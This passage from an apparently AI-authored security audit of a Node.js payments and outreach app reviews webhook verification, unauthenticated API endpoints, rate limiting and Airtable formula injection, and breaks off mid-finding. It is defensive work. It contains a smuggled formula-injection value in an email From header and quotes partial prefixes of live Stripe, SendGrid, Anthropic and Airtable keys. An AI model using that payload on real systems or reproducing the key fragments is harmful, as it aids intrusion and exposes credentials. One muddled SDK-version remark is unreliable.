# Security Audit — 2026-06-12

> **Type:** Discovery report (Brief 14.1). No code changes.
> **Scope:** Verification of operator hypothesis list + mandatory precisions A-H + additional findings.
> **Audit boundary:** commit `7c0e015` (post-Brief-14 schema cleanup).
> **Auditor:** Antigravity (Claude Sonnet 4.6 Thinking), 2026-06-12.

---

## Executive Summary

Audit covered 15 source files across `src/`, `package.json`, `.env`, `.gitignore`, `dashboard/`, and `docs/`. Full search sweeps performed for rate limiting, CORS/helmet, validation libraries, hardcoded secrets, formula injection sites, CI/CD tooling, and IP filtering. **27 findings produced** (1 CRITICAL, 8 HIGH, 7 MEDIUM, 4 LOW, 4 INFO, 3 Already Implemented).

The most urgent risk is **Finding B.2.A** (all six Brief 14 API endpoints are publicly accessible with zero authentication — including `POST /api/deals/:dealId/release-20-percent` which fires Stripe transfers). This is CRITICAL and ship-blocking before first brand. A close second is **Finding B.1.2-2.3/B.2.B** (Airtable formula injection from attacker-controlled email addresses in reply matching and in the inbound bounce handler). The missing rate-limiting and CORS posture (Finding 2.1, 2.2) compound the auth gap by making unauthenticated endpoints trivially abusable from any origin.

The `.env` file contains real, live production credentials for Stripe (`sk_live_`), SendGrid (`SG.`), Anthropic (`sk-ant-`), Airtable (`pat`), and other services. The file is correctly excluded from git via `.gitignore` and does not appear in git history — this is the correct posture, but is noted as a procedure risk.

| Severity | Count |
|---|---|
| CRITICAL | 1 |
| HIGH | 8 |
| MEDIUM | 7 |
| LOW | 4 |
| INFO | 4 |
| Already implemented | 3 |
| Not applicable | 0 |

---

## Section 1 — Existing Controls (verified)

### Finding EC-1 — Stripe HMAC Verification

**Severity:** Already implemented
**Category:** Webhook hardening
**Status:** Partially implemented

**Evidence (file/line citations required):**
- `src/server.js:52` — `event = stripe.webhooks.constructEvent(req.body, sig, process.env.STRIPE_WEBHOOK_SECRET);`
- `src/server.js:47` — `express.raw({ type: 'application/json' })` applied inline on the route before `express.json()` at line 646 — raw body correctly preserved.
- `src/server.js:53-55` — Errors caught; response returns `400` with `err.message` embedded: `return res.status(400).send(\`Webhook Error: ${err.message}\`);`

**Description:**
Stripe HMAC verification is correctly implemented using the official SDK's `stripe.webhooks.constructEvent()`. Raw body middleware is applied inline before the global `express.json()`, preserving the exact wire bytes the Stripe signature covers. The timestamp tolerance is managed by the Stripe SDK internally (default: 300 seconds). One gap: the error response on line 55 reflects `err.message` back to the caller. In practice Stripe's SDK error messages do not contain payload data, but this pattern creates a class of risk if the error message ever included body fragments.

**Concrete attack scenario:**
No immediate exploitation path — verification is hard-enforced. The error message reflection is a defense-in-depth concern only.

**Suggested remediation path:**
Replace `${err.message}` in the 400 response with a static string `"Webhook signature verification failed"` to eliminate any class of message reflection. Change is trivial. Timestamp tolerance is SDK-managed and acceptable as-is.

**Estimated remediation effort:** trivial

---

### Finding EC-2 — PandaDoc HMAC Verification

**Severity:** Already implemented (with critical gap)
**Category:** Webhook hardening
**Status:** Partially implemented

**Evidence (file/line citations required):**
- `src/utils/pandadoc_signature.js:11-24` — HMAC-SHA256 computed with `crypto.createHmac`; constant-time comparison via `crypto.timingSafeEqual`. Timing-attack resistance: **confirmed**.
- `src/server.js:244` — `const isVerified = verifyPandaDocSignature(rawBody, signature, process.env.PANDADOC_WEBHOOK_SECRET);`
- `src/server.js:247-258` — Soft-fail mode: `if (!isVerified) { if (process.env.PANDADOC_VERIFY_STRICT === 'true') { ... return 401; } else { console.warn('...accepting webhook anyway'); } }`

**Description:**
`verifyPandaDocSignature` is correctly implemented with constant-time comparison (timing-attack resistant). The critical gap: enforcement is gated on `PANDADOC_VERIFY_STRICT === 'true'`. If this env var is absent or false, the handler accepts unauthenticated PandaDoc webhooks with only a console warning. In production on Render, if `PANDADOC_VERIFY_STRICT` is not set, any HTTP client can POST to `/webhooks/pandadoc` and trigger document-state processing, including the `CONTRACTS_SIGNED` transition (line 369-374).

**Concrete attack scenario:**
Attacker sends a crafted POST to `https://influencer-brokerage-os.onrender.com/webhooks/pandadoc` with a valid-looking JSON payload containing `event: "document_state_changed"`, `data.id: <known_doc_id>`, `data.status: "document.completed"`. If `PANDADOC_VERIFY_STRICT` is not set, the handler processes it, writes a `contract_signed_brand` or `contract_signed_creator` ComplianceEvent, and potentially transitions the Deal to `CONTRACTS_SIGNED` — bypassing actual PandaDoc signing.

**Suggested remediation path:**
Set `PANDADOC_VERIFY_STRICT=true` in Render environment variables. This is an environment configuration fix, not a code fix. Document as a required production env var. Consider making strict enforcement the default (no env var needed to enable it — flip the default).

**Estimated remediation effort:** trivial (env var set) to small (flip default in code)

---

### Finding EC-3 — SendGrid ECDSA Verification

**Severity:** Already implemented (with gap)
**Category:** Webhook hardening
**Status:** Partially implemented

**Evidence (file/line citations required):**
- `src/utils/sendgrid_signature.js:21-64` — ECDSA verification via `@sendgrid/eventwebhook` SDK. Three-mode behavior: no-key → soft-fail (accept all), key-present + `SENDGRID_VERIFY_STRICT` not set → log-only, key-present + strict → enforce.
- `src/utils/sendgrid_signature.js:26-29` — If `SENDGRID_WEBHOOK_PUBLIC_KEY` absent: `console.warn('...'); return true;` — accepts without verification.
- `src/server.js:457-461` — Both inbound and bounce handlers use `verifyInboundSignature`; both return 401 on verified false.
- `.env:10` — `SENDGRID_WEBHOOK_PUBLIC_KEY` is populated in the local `.env`; production Render config is operator-confirmed needed.

**Description:**
Same soft-fail pattern as PandaDoc. ECDSA verification is implemented correctly with the SendGrid SDK. The gap is the bootstrap mode: if `SENDGRID_WEBHOOK_PUBLIC_KEY` is absent from Render environment, the handler accepts all inbound emails without signature verification, making the entire inbound email pipeline spoofable. `SENDGRID_VERIFY_STRICT` must also be set to enforce rejection on mismatch. Without both, signature verification is advisory only.

**Concrete attack scenario:**
If `SENDGRID_WEBHOOK_PUBLIC_KEY` is missing from Render env, attacker posts to `/webhooks/sendgrid/inbound` with any `from:` header and email body; handler accepts it and runs `processInboundEmail`, triggering LLM classification, potential roster link dispatch, and YELLOW/RED flag writes — all on fabricated input.

**Suggested remediation path:**
Verify `SENDGRID_WEBHOOK_PUBLIC_KEY` and `SENDGRID_VERIFY_STRICT=true` are both set in Render environment. Add a startup assertion that fails loud if the key is absent in production. The three-mode design in `sendgrid_signature.js` is appropriate for development; tighten production defaults.

**Estimated remediation effort:** trivial (env vars) to small (startup assertion)

---

### Finding EC-4 — WebhookEvents Idempotency Table Coverage

**Severity:** Already implemented
**Category:** Webhook hardening
**Status:** Already implemented

**Evidence (file/line citations required):**
- `src/utils/webhook_idempotency.js:5-18` — `findExistingEvent(provider, eventId)` queries `WebhookEvents` table.
- `src/server.js:58-62` — Stripe: `findExistingEvent('stripe', event.id)` called before processing.
- `src/server.js:297-301` — PandaDoc: `findExistingEvent('pandadoc', event_id)` called per event in loop.
- `src/server.js:488-492` — SendGrid inbound: `findExistingEvent('sendgrid', idempotencyKey)` called.
- `src/server.js:597-600` — SendGrid bounce: `findExistingEvent('sendgrid', idempotencyKey)` called.

**Description:**
All four webhook handlers call `findExistingEvent` before processing. The idempotency key construction is appropriate for each provider: Stripe uses the native Stripe event ID (`evt_xxx`), PandaDoc constructs a SHA-256 of `docId|docStatus|dateModified`, SendGrid inbound uses SHA-256 of `from|timestamp|subject`, and SendGrid bounce uses `bounce|sg_message_id|email`. All four handlers return 200 on duplicates without reprocessing. Coverage is complete.

**Concrete attack scenario:**
Not applicable — control is implemented.

**Suggested remediation path:**
No fix needed. Note: `findExistingEvent` silently returns `null` on error (line 14-16 of `webhook_idempotency.js`), meaning a transient Airtable failure during the existence check falls through to reprocessing. This is an acceptable trade-off documented in the brief; surfaced for awareness.

**Estimated remediation effort:** n/a (already implemented)

---

### Finding EC-5 — Magic-Link + Roster Token (Stage A4)

**Severity:** INFO
**Category:** Auth
**Status:** Partially implemented (roster token exists; magic-link auth for API endpoints is future scope)

**Evidence (file/line citations required):**
- `src/skills/negotiation_handler.js:564-577` — `generateRosterLink()` generates a 16-byte random token via `crypto.randomBytes(16)`, stores it in Airtable, sets 14-day expiry, and returns a URL.
- `src/server.js:650-651` — `GET /roster`: `const token = req.query.t; if (!token) return res.status(400).send("Invalid or missing token.");`
- `src/server.js:659-661` — Expiry check: `if (brand.roster_token_expires && new Date() > new Date(brand.roster_token_expires)) return res.status(410).send("This roster link has expired.");`
- `src/server.js:1061-1133` — Brief 14 compliance/payout endpoints: **no auth middleware present** (see Finding B.2.A).

**Description:**
The roster token system is implemented and provides per-brand access control for the roster portal. However, the "magic-link + roster_token" as described in §4.6 for Stage A4 is roster-specific only — it does NOT extend to the API endpoints introduced in Brief 14. The six compliance/payout endpoints have zero authentication. The roster portal token is not used as a general API auth mechanism.

**Concrete attack scenario:**
No immediate attack on the roster token itself (16 bytes = 128 bits of entropy is adequate). Attack vector for the missing API auth is covered in Finding B.2.A.

**Suggested remediation path:**
Document that Stage A4 auth (magic-link for operator dashboard) is not yet implemented. Brief 14.2 should design an auth layer for the six Brief 14 endpoints. The roster token is not a substitute — it's brand-facing, not operator-facing.

**Estimated remediation effort:** n/a (separate brief scope)

---

### Finding EC-6 — Tool-Use / Structured Output (No Raw JSON Parsing)

**Severity:** Already implemented (with dead-code gap)
**Category:** Forward-looking
**Status:** Partially implemented

**Evidence (file/line citations required):**
- `src/utils/llm.js:67-236` — `chatCompletion()` enforces tool-use via `tool_choice: { type: 'tool', name: tool.name }`. Model is forced to call the specified tool; raw text fallback explicitly rejected at line 151-153.
- `src/utils/llm.js:7-40` — `classifyAndExtract()` is **still present** in the codebase. It uses `anthropic.messages.create()` without tool-use and parses raw text JSON at line 31: `return JSON.parse(textResponse);`
- `src/skills/negotiation_handler.js:42` — `import { chatCompletion } from '../utils/llm.js';` — negotiation handler correctly imports `chatCompletion`, not `classifyAndExtract`.

**Description:**
`chatCompletion` (tool-use enforced) is the production path for all active LLM calls in `negotiation_handler.js` and `outreach_engine.js`. `classifyAndExtract` is dead code — it is imported nowhere in the active codebase (grep confirms zero call sites outside its own file). However, it remains in `llm.js` with its JSON-parse-from-text implementation, creating a maintenance risk: a future implementer could import it, bypassing the tool-use guarantee. The K.8 note in the brief acknowledges this as documented dead code.

**Concrete attack scenario:**
No direct exploitation today. Risk is that a future brief imports `classifyAndExtract` for a new classifier, reintroducing raw JSON parse fragility.

**Suggested remediation path:**
Mark `classifyAndExtract` with a `@deprecated` JSDoc comment pointing to `chatCompletion`. Brief 14.4's cleanup scope can remove it. No urgent action needed.

**Estimated remediation effort:** trivial (comment) to small (removal)

---

### Finding EC-7 — Environment Secrets in `.env` (Not Committed)

**Severity:** Already implemented (with local exposure concern)
**Category:** Logging
**Status:** Partially implemented

**Evidence (file/line citations required):**
- `.gitignore:2` — `.env` is listed in `.gitignore`.
- `git ls-files .env` → empty output — confirmed `.env` is not tracked in git history.
- `.env:6` — `SENDGRID_API_KEY=SG.TzCCkZnjTGiP9K6zeGHQCg...` — live key present in local file.
- `.env:22` — `STRIPE_SECRET_KEY=sk_live_51Rbiv1...` — live Stripe key present in local file.
- `.env:38` — `ANTHROPIC_API_KEY=sk-ant-api03-vgI...` — live Anthropic key present in local file.
- `.env:18` — `AIRTABLE_API_KEY=pat6nzDb8VER...` — live Airtable personal access token present in local file.

**Description:**
Secrets are correctly excluded from version control. No hardcoded secrets found in any `.js` source file (search for `sk_live`, `SG.`, `sk-ant-`, `pat` patterns returned zero source-file matches). However, the `.env` file in the workspace contains **real live production credentials** for all five critical services. This is a local machine exposure risk — if the development machine is compromised, all service credentials are exposed. There is no `.env.example` file in the repo to document which keys are expected without storing values.

**Concrete attack scenario:**
Local machine compromise (malware, physical access, cloud backup leak) exposes all production credentials simultaneously. The Stripe key is `sk_live_` — live production key with full charge/transfer capability.

**Suggested remediation path:**
(1) Create a `.env.example` file in the repo root listing all required env var names with placeholder values. (2) Surface in Section 6 as an operator action item: verify the local `.env` is not backed up to iCloud/Dropbox/cloud sync. See Section 6 for escalation note.

**Estimated remediation effort:** trivial

---

## Section 2 — Hypothesis Findings (B.1.2 items 2.1-2.10)

### Finding 2.1 — Rate Limiting

**Severity:** HIGH
**Category:** DoS
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- `package.json:19-33` — Dependencies list: no `express-rate-limit`, `express-slow-down`, or any rate-limiting package present.
- Search for `rate.*limit|express-rate-limit|slowDown|throttle` across all `src/**/*.js`: Only matches found in comments/strings (e.g., `outreach_orchestration.js:64` mentions "Airtable rate limit" in a comment; `llm.js:199` references HTTP 429 from upstream). Zero application-level rate-limiting middleware exists.
- `src/server.js:646` — `app.use(express.json())` — only body parsing middleware; no rate-limit middleware registered anywhere before or after.

**Description:**
There is no rate-limiting middleware on any endpoint in the application. Express's default configuration accepts unlimited concurrent requests. Every endpoint — including the LLM-triggering `POST /api/outreach/batch` and the Stripe-transfer-triggering `POST /api/deals/:dealId/release-20-percent` — is unbounded.

**Concrete attack scenario:**
Attacker sends 100 concurrent POST requests to `/api/outreach/batch` with valid `brandId` values. Each triggers `matchCreatorsForBrand` + `scoreMatches` + N × `generateOutreachDraft` (each generating N Anthropic API calls with `max_tokens: 4096`). At $3–15 per 1M tokens, 100 batches × 20 creators × 4096 output tokens = ~8M output tokens ≈ $40–120 in Anthropic charges within a single minute. This is compounded by Finding B.2.A: the endpoint requires no authentication.

**Suggested remediation path:**
Add `express-rate-limit` middleware at the router level. Separate limits for: (a) public endpoints (5 req/15 min per IP), (b) outreach/batch (1 req/min per IP), (c) webhook endpoints (Stripe/PandaDoc/SendGrid should not need rate limiting as verification gates already exist). This finding depends on B.2.A — auth reduces but does not eliminate rate-limit need (authenticated operators can also cause runaway spend).

**Estimated remediation effort:** small

---

### Finding 2.2 — Security Headers & CORS

**Severity:** HIGH
**Category:** Auth
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- `package.json:19-33` — No `helmet`, `cors` package present.
- Search for `helmet|cors|CORS|Access-Control` across all `src/**/*.js`: zero matches.
- `src/server.js:34-646` — Only middleware registered globally is `express.static()` (line 42) and `express.json()` (line 646). No `helmet()`, no CORS headers, no `X-Frame-Options`, no `Content-Security-Policy`, no `X-Content-Type-Options`.

**Description:**
No security headers are set. The API has no CORS policy — requests from any origin are accepted. The dashboard at `src/server.js:42` (`express.static()`) serves the operator dashboard HTML/JS with no `X-Frame-Options` or CSP, making it frameable. No `X-Content-Type-Options: nosniff` is set, enabling MIME-type sniffing attacks on static assets.

**Concrete attack scenario:**
A malicious website embeds the operator dashboard in an iframe and uses clickjacking to trick an authenticated operator into clicking "Release 20%" on a deal. Without `X-Frame-Options: DENY` or CSP `frame-ancestors: 'none'`, the iframe loads successfully. This is more relevant once auth (Brief 14.2) is implemented — currently the lack of auth makes clickjacking redundant, but the fix needs to land alongside auth.

**Suggested remediation path:**
Add `helmet()` middleware (sets 11 security headers including X-Frame-Options, CSP, HSTS, nosniff). For CORS: if the dashboard and API share the same origin (Render URL), CORS is not needed for the dashboard — but any future separate-origin client would need explicit CORS configuration with a whitelist. Do not use `cors()` with `origin: '*'` for financial API endpoints.

**Estimated remediation effort:** trivial (adding `helmet()`) to small (configuring CORS policy)

---

### Finding 2.3 — Request Validation (Airtable Formula Injection)

**Severity:** HIGH
**Category:** Injection
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- Search for `zod|joi|express-validator|ajv` across all `src/**/*.js`: zero matches. No request validation library in codebase or `package.json`.
- `src/server.js:532-533` — Inbound email handler: `const influencers = await fetchRecords(influencersTable, \`{email} = '${senderEmail}'\`);` and `const brands = await fetchRecords(brandsTable, \`{contact_email} = '${senderEmail}'\`);` — `senderEmail` derives from `fields.from` via regex at line 502-503, ultimately sourced from attacker-controlled inbound email `From:` header.
- `src/server.js:612,620` — Bounce handler: `fetchRecords(influencersTable, \`{email} = '${email}'\`)` and `fetchRecords(brandsTable, \`{contact_email} = '${email}'\`)` — `email` sourced from `evt.email` in the SendGrid bounce payload, attacker-controllable if SendGrid signature verification is in soft-fail mode.
- `src/skills/negotiation_handler.js:335` — Tier 2 reply matching: `const brands = await fetchRecords(brandsTable, \`LOWER({contact_email}) = '${senderLower}'\`);` — `senderLower` is `senderEmail.toLowerCase().trim()` traced to `fields.from` → attacker-controlled.
- Full injection site list (see B.2.B for exhaustive enumeration).

**Description:**
No input validation library is used anywhere in the codebase. Multiple Airtable formula construction sites interpolate values that originate from external HTTP inputs (inbound email payloads, webhook bodies) without sanitization. An apostrophe in the interpolated value breaks the formula string; formula metacharacters (`}`, `AND(`, `OR(`) can corrupt query semantics. No `zod`, `joi`, or `ajv` in `package.json`.

**Concrete attack scenario:**
Attacker sends email to the brokerage's Inbound Parse address with `From: attacker+test'OR(1=1)@evil.com`. At `server.js:532`, the formula becomes `{email} = 'attacker+test'OR(1=1)@evil.com'`. Airtable rejects the malformed formula → `fetchRecords` returns `[]` (catches error and returns empty). This is a DoS on the lookup, not a data exfiltration — Airtable's formula language does not support true SQL-injection-style extraction. However, at the Tier 2 matching formula (`negotiation_handler.js:335`): `LOWER({contact_email}) = 'attacker+test'OR(1=1)@evil.com'` → formula parse error → Airtable returns `[]` → the reply fails to match to any draft, disrupting classification. Repeated across all inbound emails from an attacker-controlled domain, this causes persistent DoS on the reply-matching pipeline.

**Suggested remediation path:**
Sanitize all values interpolated into Airtable formulas: at minimum, escape single quotes by replacing `'` with `\'`. Ideally, add a centralized `sanitizeFormulaValue(str)` helper in `airtable.js` and replace all bare template-literal interpolations. A validation library (`zod`) at the route handler level would also catch malformed inputs earlier in the pipeline.

**Estimated remediation effort:** small

---

### Finding 2.4 — Session/Token Security

**Severity:** HIGH
**Category:** Auth
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- Search for `session|cookie|jwt|bearer|Authorization` across `src/**/*.js`: zero matches (the CSRF search confirmed no token-in-header auth exists).
- `src/server.js:807-1152` — All API endpoints register no middleware between Express registration and handler function. No `req.user`, no `req.session`, no bearer token check.
- `src/server.js:884` — `POST /api/release_payout`: no auth. `src/server.js:977` — `POST /api/outreach/batch`: no auth. `src/server.js:1024` — `POST /api/deals/:dealId/release-20-percent`: no auth.

**Description:**
There is no session management or token-based authentication of any kind for the API layer. The operator dashboard at `/` is served as a static SPA. Any HTTP client with knowledge of the Render URL can call any API endpoint, including financial-action endpoints (`/api/release_payout`, `/api/deals/:dealId/release-20-percent`) and LLM-cost endpoints (`/api/outreach/batch`). This is the root finding that the CRITICAL B.2.A finding elaborates.

**Concrete attack scenario:**
See Finding B.2.A for the specific six-endpoint enumeration. For existing legacy endpoints: `POST /api/release_payout` with any `deal_id` triggers payout flagging and an operator alert email — attacker can flood the operator's inbox. `POST /api/generate_contracts` with no body triggers `generateContracts()` for all locked deals — potentially sending unexpected PandaDoc documents.

**Suggested remediation path:**
Brief 14.2 must design an auth layer. The minimum viable option for a solo-operator system is a static secret token in an `Authorization: Bearer <token>` header checked on all POST endpoints, stored in Render env vars. This is not full OAuth but provides meaningful protection before a full auth system is warranted.

**Estimated remediation effort:** medium (auth design + middleware + all endpoint coverage)

---

### Finding 2.5 — Environment Variable Exposure in Error Responses

**Severity:** LOW
**Category:** Logging
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- `src/utils/errorHandler.js:13-49` — `logError()` writes to `logs/error_log.jsonl` and `console.error`. The `context` object (line 19) is logged as-is — if a caller passes a context containing env-var-adjacent data, it's logged. No redaction.
- `src/server.js:55` — `return res.status(400).send(\`Webhook Error: ${err.message}\`);` — Stripe error message reflected to caller.
- `src/server.js:879,892,924,934,963,988` — Multiple catch blocks: `res.status(500).json({ error: error.message })` — raw Node.js error message reflected to API caller. If a module throws with internal state (e.g., Airtable SDK throws with request details), those details reach the API response.
- `src/utils/errorHandler.js:46-47` — CRITICAL tier: `console.error(...)` then `process.exit(1)`. Error does NOT reach HTTP response (process exits). Acceptable.
- No `NODE_ENV` checks found anywhere in source — `NODE_ENV` is not used to toggle any security behavior.

**Description:**
Error responses from all API catch blocks reflect `error.message` directly into the HTTP response body. This can leak internal state: Airtable SDK errors include record IDs and field names; Stripe SDK errors include endpoint details. No `NODE_ENV` flag gates this behavior — stack traces are not reflected (Express does not auto-include them), but message strings are. No request payload redaction exists in logger.

**Concrete attack scenario:**
Attacker sends a POST to `/api/confirm_payout_complete` with a nonexistent `deal_id`. If the Airtable SDK throws on the `fetchRecords` call (e.g., on a network error), the raw Airtable error message — which may include the base ID and table name — is returned in `{ error: "..." }`. This provides enumeration assistance: "Deal not found" vs an Airtable SDK error reveals system internals.

**Suggested remediation path:**
Introduce a sanitized error response helper: return generic `"Internal server error"` for 500s in production, while logging the full error internally. Distinguish client errors (400s with safe messages) from server errors (500s with generic messages). Consider checking `NODE_ENV === 'production'` to suppress detailed messages.

**Estimated remediation effort:** small

---

### Finding 2.6 — Security Logging

**Severity:** MEDIUM
**Category:** Logging
**Status:** Partially implemented

**Evidence (file/line citations required):**
- `src/utils/logger.js:24-40` — `logActivity()` writes to `logs/activity_log.jsonl`. Logs 5 fields: timestamp, skill_name, deal_id, action, previous_state, new_state. No IP address, no user agent, no request ID.
- `src/utils/errorHandler.js:13-49` — `logError()` writes to `logs/error_log.jsonl`. Logs: timestamp, tier, source, message, context object.
- `src/utils/logger.js:8-14` — Ephemeral filesystem note: catches `fs.mkdirSync` errors for Render. On Render's free tier, the filesystem is ephemeral — `logs/` directory is wiped on each deploy/restart. Log files do not persist between restarts.
- No centralized auth/access log exists — no request-level logging of IP, user agent, or endpoint accessed.
- `src/server.js:84` — Auth failure on Stripe: `console.error('❌ Stripe webhook signature failed:', err.message)` — not routed through `logError()`.
- `src/server.js:459` — Auth failure on SendGrid inbound: `console.warn('❌ SendGrid inbound signature failed')` — console only, no structured log.

**Description:**
Logging infrastructure exists (`logActivity` + `logError`) but has two material gaps: (1) logs are written to an ephemeral filesystem on Render free tier — they do not survive restarts, making incident reconstruction impossible; (2) webhook auth failures are logged to console only (not structured), and there is no request-level access log for API endpoints, making attacker enumeration activity invisible.

**Concrete attack scenario:**
An attacker probes all six Brief 14 endpoints over 48 hours. On Render free tier, the server restarts every 15 minutes on inactivity. Each restart wipes the log files. The operator has zero visibility into the probe activity.

**Suggested remediation path:**
Route all security-relevant events (auth failures, signature mismatches, rate-limit hits) through `logError()` so they reach the structured log. Separately, investigate Render persistent log export (Render supports log drains to external services). Brief 14.4's CI scope should include log retention policy documentation.

**Estimated remediation effort:** small (structured logging) to medium (persistent log infrastructure)

---

### Finding 2.7 — Dependency Scanning

**Severity:** MEDIUM
**Category:** Forward-looking
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- `Test-Path ".github"` → `False` — no `.github/` directory exists. No GitHub Actions workflows.
- Search for `.snyk` → not found.
- `package.json:10-17` — `scripts` object: `start`, `scout`, `scout:brand`, `outreach:influencer`, `outreach:brand`, `followup`, `tracker`. No `audit`, `audit:fix`, or security-related script.
- `package.json:19-33` — Dependencies eyeball for obviously outdated packages: `express: "^4.19.2"` (current stable is 4.21.x — minor version gap, not major concern); `stripe: "^15.0.0"` (current is v17+ — two major versions behind; Stripe SDK major versions may include breaking changes in webhook handling); `axios: "^1.6.8"` (current 1.7.x — minor gap); `@anthropic-ai/sdk: "^0.98.0"` (current is v0.39 — wait, this is actually a very high semver number; verify against npm). No `package-lock.json` integrity audit performed.

**Description:**
No automated dependency scanning exists. No CI pipeline, no Dependabot, no Snyk, no `npm audit` script. The Stripe SDK is two major versions behind (`^15` vs current `^17`), which may include security patches. Without a CI pipeline, dependency vulnerabilities will not be surfaced until manually run.

**Concrete attack scenario:**
A transitive dependency in `node_modules` has a known CVE (e.g., `axios` ReDoS, `express` path traversal in an older version). Without automated scanning, the vulnerability is not discovered until a breach occurs or a manual `npm audit` is run.

**Suggested remediation path:**
Add `"audit": "npm audit --audit-level=high"` to `package.json` scripts. Run `npm audit` now (Brief 14.4 scope). Add GitHub Actions workflow with `npm audit` on push. Consider Dependabot for automated PRs. The Stripe SDK should be upgraded from `^15` to `^17` to pick up any security patches in major versions 16 and 17.

**Estimated remediation effort:** small (npm audit + script) to medium (CI pipeline)

---

### Finding 2.8 — API Key Rotation

**Severity:** INFO
**Category:** Forward-looking
**Status:** Not applicable to current architecture (procedure concern)

**Evidence (file/line citations required):**
- No code-level rotation mechanism exists or is expected.
- `.env:6,18,22,27,38` — All production API keys are static strings. No rotation schedule is documented.

**Description:**
API key rotation is a procedure concern, not a code gap. The codebase correctly reads all secrets from environment variables (no hardcoding found). Rotation requires: (1) generating a new key in the provider dashboard, (2) updating the Render environment variable, (3) triggering a redeploy. No automated rotation mechanism is needed at current scale.

**Concrete attack scenario:**
If a key is compromised (e.g., via machine compromise per EC-7), the operator must be able to rotate it quickly. Without a documented rotation runbook, the time-to-rotate is uncertain.

**Suggested remediation path:**
Create a `docs/key_rotation_runbook.md` documenting: which keys exist, where each is set in Render, what systems must be updated in sequence (e.g., Stripe webhook secret must be updated in both Stripe dashboard and Render env simultaneously to avoid a verification gap). No code changes needed. This is a documentation deliverable for a subsequent brief.

**Estimated remediation effort:** trivial (documentation)

---

### Finding 2.9 — Webhook IP Whitelist

**Severity:** LOW
**Category:** Webhook hardening
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- Search for `ip|whitelist|x-forwarded-for|remoteAddress` in server.js and utils: results were comments and string occurrences only — no IP extraction or filtering code found.
- `src/server.js:47-103` — Stripe webhook: no IP check before signature verification. Stripe publishes their webhook IP ranges at `https://stripe.com/files/stripe-ips.json`.
- `src/server.js:240-447` — PandaDoc webhook: no IP check.
- `src/server.js:452-558` — SendGrid inbound: no IP check.

**Description:**
No IP whitelisting on any webhook endpoint. However, all three webhook providers (Stripe, PandaDoc, SendGrid) implement HMAC/ECDSA signature verification, which provides cryptographic authentication superior to IP filtering. IP filtering is a defense-in-depth control — it reduces noise and provides an additional barrier, but is not strictly required when signature verification is correctly implemented and enforced (which it currently is not for PandaDoc/SendGrid without `STRICT=true`). The gap is most significant for PandaDoc in soft-fail mode.

**Concrete attack scenario:**
Until `PANDADOC_VERIFY_STRICT=true` is set (EC-2 remediation), an attacker from any IP can POST to `/webhooks/pandadoc` and have their payload processed. IP whitelisting PandaDoc's egress ranges would prevent this even in soft-fail mode.

**Suggested remediation path:**
First priority: fix soft-fail modes (EC-2, EC-3). IP whitelisting is a secondary defense-in-depth measure. If added, implement as middleware using Stripe's published IP range JSON, PandaDoc's documented webhook source IPs, and SendGrid's published IP ranges. Render terminates TLS and may modify `req.ip` — validate that `X-Forwarded-For` is trustworthy before relying on it for IP filtering.

**Estimated remediation effort:** small to medium

---

### Finding 2.10 — Outbound Request Hardening

**Severity:** LOW
**Category:** DoS
**Status:** Partially implemented

**Evidence (file/line citations required):**
- `src/utils/notifications.js:95` — `fetch('https://api.sendgrid.com/v3/mail/send', ...)` — no `signal` (timeout) option. If SendGrid is slow, the request hangs indefinitely.
- `src/skills/payment_handler.js:127` — `fetch('https://api.sendgrid.com/v3/mail/send', ...)` in `sendOperatorPayoutAlert()` — same pattern, no timeout.
- `src/skills/payment_handler.js:272` — `stripe.transfers.create(...)` — Stripe Node SDK has a default 80-second timeout; acceptable.
- `src/skills/lead_discovery/utils/http_client.js:37,60` — `const timeout = options.timeout ?? 15000;` with `AbortController` — **timeout implemented correctly** for lead discovery HTTP calls.
- `src/utils/llm.js:135` — `anthropic.messages.create(...)` — Anthropic SDK uses its own timeout; `llm.js` has a retry loop with exponential backoff (lines 224-229) but no explicit max-wait ceiling.

**Description:**
Outbound `fetch()` calls in `notifications.js` and `payment_handler.js` have no timeout configuration. If SendGrid's API is slow or unresponsive, the inbound email handler (`server.js` → `processInboundEmail` → `writeReplyCorrelationToDraft` → outbound email) and the payout alert function will hang, blocking the async handler. On Render's free tier, a hanging request consumes a worker slot and can cascade to service unavailability. TLS pinning is confirmed out of scope per brief.

**Concrete attack scenario:**
A SendGrid API incident causes all outbound email calls to hang for 120 seconds. During this window, every inbound webhook that triggers an email dispatch occupies a Node.js async "slot" (though Node.js is non-blocking, the promise chain hangs). If the event loop is saturated with hanging fetches, new webhook events queue up. The Stripe webhook may time out from Stripe's side, triggering retries — but idempotency handling prevents double-processing.

**Suggested remediation path:**
Add `AbortController`-based timeouts to all `fetch()` calls in `notifications.js` and `payment_handler.js`, mirroring the pattern already implemented in `http_client.js`. A 30-second timeout is appropriate for email dispatch. This does not affect TLS verification.

**Estimated remediation effort:** trivial

---

## Section 3 — Mandatory Precision Findings (B.2.A-H)

### Finding B.2.A — Auth on Brief 14 Read Endpoints

**Severity:** CRITICAL
**Category:** Auth
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- `src/server.js:1061-1073` — `GET /api/deals/:dealId/compliance-status`: no auth middleware. First line of handler: `const { dealId } = req.params;` — immediately uses the dealId.
- `src/server.js:1078-1096` — `GET /api/deals/:dealId/payout-schedule`: no auth middleware. Returns `creator_payout_schedule` JSON including `split_80_amount`, `split_20_amount`, `split_80_released_at`, `split_20_stripe_transfer_id`.
- `src/server.js:1100-1108` — `GET /api/deals/:dealId/compliance-events`: no auth middleware. Returns all ComplianceEvents for any deal, including `event_payload` field.
- `src/server.js:1115-1133` — `GET /api/deals/:dealId/compliance-spec`: no auth middleware. Returns `compliance_spec` JSON which contains full campaign terms, payout amounts, delivery requirements.
- `src/server.js:1024-1051` — `POST /api/deals/:dealId/release-20-percent`: no auth middleware. Calls `checkDay30Eligibility()` then `release20Percent(dealId)` which fires a `stripe.transfers.create()` — **real Stripe transfer triggered by unauthenticated request**.
- `src/server.js:1143-1152` — `GET /api/unresolved-payments`: no auth middleware. Returns `payment_intent_id`, `customer_email`, `amount` for all unresolved payment records.
- Middleware gap confirmed: the only middleware between the route registrations and any handler is `express.json()` at line 646.

**Description:**
